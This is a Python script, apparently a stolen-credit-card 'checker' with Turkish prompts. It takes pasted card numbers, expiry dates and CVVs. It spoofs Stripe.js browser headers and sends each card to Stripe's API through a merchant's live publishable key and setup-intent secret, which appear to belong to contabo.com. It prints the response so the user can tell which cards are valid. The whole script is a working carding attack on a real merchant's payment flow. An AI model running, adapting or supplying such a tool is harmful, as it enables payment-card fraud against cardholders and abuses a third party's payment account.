import requests
from requests.models import Response
from colorama import Fore, Back, Style, init
init(autoreset=True)

print (Fore.GREEN +"--------------------------------------")
print (Fore.GREEN +"  ...  ░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░  ... ")
print (Fore.GREEN +"  ...  ░░░░█░░░░░░░░░░░░░█░░░░  ... ")
print (Fore.GREEN +"  ...  ░░░█░░░░░░░░░░▄▄▄░░█░░░  ... ")
print (Fore.GREEN +"  ...  ░░░█░░▄▄▄░░▄░░███░░█░░░  ... ")
print (Fore.GREEN +"  ...  ░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░  ... ")
print (Fore.GREEN +"  ...  ░░░█░░▀█▀█▀█▀█▀█▀░░█░░░  ... ")
print (Fore.GREEN +"  ...  ░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░  ... ")
print (Fore.GREEN +"  ...  ░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░  ... ")
print (Fore.GREEN +"--------------------------------------")
print (Fore.LIGHTYELLOW_EX +"    Github :    github.com/aligollez " )                  

def funct():
    
    ccbol = input( Fore.RED + '   CC GİR (4001770512xxx|09|23|013) : ').splitlines()
    kartlar = []

    for i in ccbol:
            bolum = i.split('|')
            kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3], ))

    return kartlar


headers = {
    'authority': 'r.stripe.com',
    'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'sec-ch-ua-mobile': '?0',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'sec-ch-ua-platform': '"Linux"',
    'origin': 'https://js.stripe.com',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://js.stripe.com/',
    'accept-language': 'en-US,en;q=0.9,tr;q=0.8,de;q=0.7',
}

data = {
    'event_name': 'elements.confirm_setup_intent',
    'client_id': 'stripe-js',
    'created': '1642204464572',
    'event_count': '28',
    'event_id': '040e7172-63d1-4561-8c61-939e80b2b7c4',
    'os': 'Linux',
    'browserFamily': 'Chrome',
    'version': '1ea91cacf',
    'key': 'pk_live_51HH2BIDecjLsXqEKPxG7aAFTODSe38BxMf9s7icV8Iw7YGP1yA5xRlApyqciUNRLJ0lLACi7Ih2gEchTgeG4QWDx00y2QL6xWD',
    'referrer': 'https://contabo.com',
    'stripe_js_id': '4755d162-c454-4dfa-b557-77ee9b92f83a',
    'controller_load_time': '1642204417794',
    'wrapper': 'unknown',
    'es_module': 'true',
    'es_module_version': '1.22.0',
    'frame_width': '509',
    'element': 'card'
}

response = requests.post('https://r.stripe.com/0', headers=headers, data=data)

headers = {
    'authority': 'api.stripe.com',
    'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'sec-ch-ua-mobile': '?0',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'sec-ch-ua-platform': '"Linux"',
    'origin': 'https://js.stripe.com',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://js.stripe.com/',
    'accept-language': 'en-US,en;q=0.9,tr;q=0.8,de;q=0.7',
}






kartlar = funct() 
for (cc, mm, yy, cvv) in kartlar:  

    #ccgir = input("<<< KART NO GİR >>>")
    #print("CC Yüklendi !", ccgir, end="!\n")
    #sktgir = input("<<< AY GİR  >>>")
    #sktgir2 = input("<<< YIL GİR (22)(24) şeklinde >>>")
    #print("Sonkullanım girildi !", ccgir, end="!\n")
    #cvvgir = input("<<< CVV GİR >>>")
    #print("CVV girildi !", ccgir, end="!\n")
    #print("CC Checkleniyor bekle aq !", ccgir, end="!\n")

    data = {
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': cc,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_month]': mm,
        'payment_method_data[card][exp_year]': yy,
        'payment_method_data[billing_details][address][postal_code]': '34583',
        'payment_method_data[guid]': '4fdefe8a-f225-4e29-bcb8-27c61f9f72d8abbe54',
        'payment_method_data[muid]': 'ad82e4fe-73b1-4db6-9289-7c72d7915da19c5fe2',
        'payment_method_data[sid]': 'f1edbb93-d247-4acd-ba45-905ea12cb76c903e62',
        'payment_method_data[pasted_fields]': 'number',
        'payment_method_data[payment_user_agent]': 'stripe.js/1ea91cacf; stripe-js-v3/1ea91cacf',
        'payment_method_data[time_on_page]': '5380482',
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'webauthn_uvpa_available': 'false',
        'spc_eligible': 'false',
        'key': 'pk_live_51HH2BIDecjLsXqEKPxG7aAFTODSe38BxMf9s7icV8Iw7YGP1yA5xRlApyqciUNRLJ0lLACi7Ih2gEchTgeG4QWDx00y2QL6xWD',
        'client_secret': 'seti_1KHza5DecjLsXqEKpo3fQlsS_secret_KxvQf3aNBVt24bKO9JiT9MFL04uGhQg'
    }

    response = requests.post(
        'https://api.stripe.com/v1/setup_intents/seti_1KHza5DecjLsXqEKpo3fQlsS/confirm', headers=headers, data=data)

    print (Style.DIM + Fore.YELLOW + response.text)
